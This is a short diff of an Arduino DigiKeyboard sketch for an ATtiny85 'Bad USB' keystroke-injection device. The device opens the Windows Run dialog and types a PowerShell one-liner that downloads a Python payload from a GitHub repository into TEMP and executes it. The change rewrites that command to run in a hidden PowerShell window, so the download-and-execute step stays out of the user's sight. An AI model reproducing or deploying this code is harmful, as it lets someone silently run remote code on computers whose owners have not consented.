@@ -19,7 +19,7 @@ void loop() {
 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(100);
-  DigiKeyboard.println("powershell -c \"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Jaepe/ATtiny85-Bad-USB/refs/heads/main/payloads/test.py',$env:TEMP+'\\a.py');python $env:TEMP\\a.py\""); //smallest cmd window possible
+  DigiKeyboard.println("powershell -c \"Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Jaepe/ATtiny85-Bad-USB/refs/heads/main/payloads/test.py', $env:TEMP + '\\a.py'); python $env:TEMP\\a.py'\"\"");
   DigiKeyboard.delay(500);
 
   digitalWrite(1, HIGH); //turn on led when program finishes - You can unplug now
